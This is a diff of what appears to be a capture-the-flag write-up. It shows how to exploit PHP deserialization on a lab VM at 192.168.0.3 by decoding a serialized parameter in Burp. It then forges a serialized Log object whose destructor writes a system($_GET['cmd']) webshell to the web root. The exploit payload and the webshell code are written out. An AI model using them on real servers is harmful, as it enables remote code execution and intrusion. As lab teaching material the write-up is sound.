@@ -67,7 +67,10 @@ Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds
 ## 2. Getting User
 
 Looks we have 401 error on the port 80.<br>
-On the other side, if we try to use other HTTP method, we can access to the hidden content.
+On the other side, if we try to use undefined HTTP method, we can access to the hidden content.
+1. There is one javascript loaded `scriptz/php.js`
+2. Serialized PHP object is created and POSTed to `index.php`.
+
 ```shell
 root@kali:~# curl -X GETS http://192.168.0.3/index.php
 
@@ -110,7 +113,10 @@ The painting is sometimes given as an example of meta message conveyed by parala
 
 Then, take a look at `192.168.0.3/scriptz`.<br>
 We have file listing.
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-04-18/valentine.png)
+![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-05-02/2020-05-01-13-53-12.png)
+
+`php.js` is for the definition of a function `serialize()` used on `index.php`.<br>
+log.php.BAK is for `Log` class.
 ```php:log.php.BAK
 root@kali:~# curl http://192.168.0.3/scriptz/log.php.BAK
 <?php
@@ -143,21 +149,28 @@ class Log
 ?>
 ```
 
+Using Burp Suite, we can see the content of the hidden webpage on GUI.<br>
+It is just a simple website with one hyperlink. Clicking the link shows us an interesting HTTP POST request with parameter.
+![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-05-02/2020-05-01-14-23-36.png)
+![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-05-02/2020-05-01-14-23-48.png)
 
+Using Burp Decoder, we can decode the parameter.<br>
+It's a PHP object of `Info` class.
+![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-05-02/2020-05-01-14-25-29.png)
 ```shell
 param=O%3A4%3A%22Info%22%3A4%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A9%3A%22firstname%22%3Bs%3A4%3A%22Rene%22%3Bs%3A7%3A%22surname%22%3Bs%3A8%3A%22Margitte%22%3Bs%3A7%3A%22artwork%22%3Bs%3A23%3A%22The+Treachery+of+Images%22%3B%7D
 ```
-
-Decode the payload. We can find out that it is a PHP object.
 ```shell
 param=O:4:"Info":4:{s:2:"id";i:1;s:9:"firstname";s:4:"Rene";s:7:"surname";s:8:"Margitte";s:7:"artwork";s:23:"The+Treachery+of+Images";}
 ```
 
 The `Log` class has `__destruct()` function which outputs a file.<br>
+Intercepting the POST request and sending this parameter, we can upload a webshell `shell.php`.
 ```shell
 param=O:3:"Log":2:{s:8:"filename";s:31:"/var/www/html/scriptz/shell.php";s:4:"data";s:60:" <?php echo '<pre>'; system($_GET['cmd']); echo '</pre>'; ?>";}
 ```
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-04-18/valentine.png)
+![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-05-02/2020-05-01-15-40-21.png)
+![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-05-02/2020-05-01-15-38-20.png)
 
 Using `curl` with GET parameter, we can see that we have uploaded our webshell successfully.
 ```shell
